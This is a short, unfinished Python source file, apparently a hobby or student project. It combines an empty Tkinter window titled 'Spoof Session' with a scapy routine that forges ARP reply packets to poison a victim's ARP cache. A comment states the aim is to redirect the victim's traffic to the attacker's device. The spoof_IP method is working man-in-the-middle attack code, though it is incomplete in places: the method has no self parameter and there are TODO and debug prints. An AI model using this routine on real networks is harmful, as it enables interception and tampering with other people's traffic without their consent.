import tkinter as tk
import utils
from scapy.all import *
class SessionView:

    def __init__(self, model):
        self.model = model

        root = tk.Tk()
        root.title("Spoof Session")
        root.focus_force()
        frame = tk.Frame(root, padx=10, pady=10)
        frame.pack(fill="both", expand=True)
        output_box = tk.Text(frame, state=tk.DISABLED)
        output_box.pack(fill="both", expand=True)
        tk.mainloop()


class SessionModel:

    def __init__(self):
        print("TODO")

    def spoof_IP(ip_to_spoof, victim_ip):

        #This command should redirect all traffic that victim_ip wants to sent to ip_to_spoof
        # to the attacker device instead
        macAttacker = utils.get_own_mac()
        ipAttacker = utils.get_own_ip()

        ipVictim = victim_ip
        macVictim = utils.find_mac_address(ipVictim)
        

        ipToSpoof = ip_to_spoof
        print(3)

        arp = Ether() / ARP()
        arp[Ether].src = macAttacker 
        arp[ARP].hwsrc = macAttacker              
        arp[ARP].psrc = ipToSpoof                 
        arp[ARP].hwdst = "ff:ff:ff:ff:ff:ff"
        arp[ARP].pdst = ipVictim                  
        arp[ARP].op = 2
        sendp(arp, count = 2, iface= conf.iface)
        arp.show()



model = SessionModel()
SessionView(model)

